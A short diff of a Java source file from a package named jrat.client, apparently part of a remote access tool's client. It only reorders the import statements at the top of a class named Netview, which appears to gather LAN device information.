@@ -1,10 +1,10 @@
 package jrat.client;
 
 import jrat.client.packets.outgoing.Packet49LanDevices;
+import oslib.OperatingSystem;
+
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
-
-import oslib.OperatingSystem;
 
 
 public class Netview extends Thread {
